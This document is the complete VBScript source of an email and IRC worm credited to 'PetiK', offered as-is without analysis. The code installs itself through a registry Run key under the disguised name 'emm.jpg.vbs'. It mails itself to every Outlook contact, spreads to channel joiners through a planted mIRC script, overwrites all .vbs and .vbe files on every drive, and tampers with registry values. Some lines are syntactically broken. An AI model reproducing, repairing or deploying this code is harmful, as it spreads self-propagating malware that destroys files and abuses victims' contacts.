'Vbs.Vbswg.EMM Worm Created By PetiK. 10/27/2009
Set Q45128E4 = createobject("scripting.filesystemobject")
Q67UU0N6 = Q45128E4.getspecialfolder(1)
C5IIJSHJ = Q67UU0N6 & "\emm.jpg.vbs"
Set G706F251 = createobject("wscript.shell")
G706F251.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\EMM", "wscript.exe " & C5IIJSHJ & " %"
Q45128E4.copyfile wscript.scriptfullname, C5IIJSHJ
AD38R7SA
If G706F251.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\EMM Worm\AC8Q63KC") <> 1 then
M5K4PN0P
End if
If G706F251.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\EMM Worm\FE6CE6PL") <> 1 then
JN178GF3 ""
End if

Function M5K4PN0P()
Set QT1S5M60 = CreateObject("Outlook.Application")
If QT1S5M60 = "Outlook" Then
Set NHU2J927 = QT1S5M60.GetNameSpace("MAPI")
Set NNN82NRN = NHU2J927.AddressLists
For Each C2C6GI54 In NNN82NRN
If C2C6GI54.AddressEntries.Count <> 0 Then
LO8TLPP2 = C2C6GI54.AddressEntries.Count
For OJ524RLF = 1 To LO8TLPP2
Set QA313IE3 = QT1S5M60.CreateItem(0)
Set MRD9IK84 = C2C6GI54.AddressEntries(OJ524RLF)
QA313IE3.To = MRD9IK84.Address
QA313IE3.Subject = "Very Important!"
QA313IE3.Body = "Hi:" & vbcrlf & "Please view this file, it's very important." & vbcrlf & ""
execute "set FJ76ECJP =QA313IE3." & Chr(65) & Chr(116) & Chr(116) & Chr(97) & Chr(99) & Chr(104) & Chr(109) & Chr(101) & Chr(110) & Chr(116) & Chr(115)
KL83UFGG = C5IIJSHJ
QA313IE3.DeleteAfterSubmit = True
FJ76ECJP.Add KL83UFGG
If QA313IE3.To <> "" Then
QA313IE3.Send
End If
Next
End If
Next
End If
End function
Function JN178GF3(CJCQC6G7)
If CJCQC6G7 <> "" Then
VL1G76R2 = G706F251.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
If Q45128E4.fileexists("c:\mirc\mirc.ini") Then
CJCQC6G7 = "c:\mirc"
ElseIf Q45128E4.fileexists("c:\mirc32\mirc.ini") Then
CJCQC6G7 = "c:\mirc32"
ElseIf Q45128E4.fileexists(VL1G76R2 & "\mirc\mirc.ini") Then
CJCQC6G7 = VL1G76R2 & "\mirc"
ElseIf Q45128E4.fileexists(VL1G76R2 & "\mirc32\mirc.ini") Then
CJCQC6G7 = VL1G76R2 & "\mirc"
Else
CJCQC6G7 = ""
End If
End If
If CJCQC6G7 <> "" Then
Set A90B7L3J = Q45128E4.CreateTextFile(CJCQC6G7 & "\script.ini", True)
A90B7L3J = "[script]" & vbCrLf & "n0=on 1:JOIN:#:{"
A90B7L3J = A90B7L3J & vbCrLf & "n0=on 1:JOIN:#:{"
A90B7L3J = A90B7L3J & vbCrLf & "n1=  /if ( $nick == $me ) { halt }"
A90B7L3J = A90B7L3J & vbCrLf & "n2=  /." & Chr(100) & Chr(99) & Chr(99) & " send $nick "
A90B7L3J = A90B7L3J & C5IIJSHJ
A90B7L3J = A90B7L3J & vbCrLf & "n3=}"
script.Close
End If
End Function
Function L5845128()
On Error Resume Next
Set EM31EEJ7 = Q45128E4.Drives
For Each I9A706F2 In EM31EEJ7
QE867UU0 = I9A706F2 & " \ "
Call N5T5IIJS(QE867UU0)
Next
End Function

Function N5T5IIJS(HUND38R7)
SPBC8Q63 = HUND38R7
Set KV15K4PN = Q45128E4.GetFolder(SPBC8Q63)
Set I5HE6CE6 = KV15K4PN.Files
For Each P3HN178G In I5HE6CE6
If lcase(P3HN178G.Name) = "mirc.ini" Then
JN178GF3(P3HN178G.ParentFolder)
End If
If Q45128E4.GetExtensionName(P3HN178G.path) = "vbs"
Q45128E4.CopyFile wscript.scriptfullname,P3HN178G.path,true
End if
If Q45128E4.GetExtensionName(P3HN178G.path) = "vbe"
Q45128E4.CopyFile wscript.scriptfullname,P3HN178G.path,true
End if
Next
Set FD1T1S5M = KV15K4PN.Subfolders
For Each F08HU2J9 In FD1T1S5M
Call (F08HU2J9.path)
Next
End function
Function AD38R7SA()
Randomize
If 1 + Int(Rnd * 10) = 7 then
G706F251.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner","PetiK"
end if
end function
'Vbswg 2 Beta. By [K]
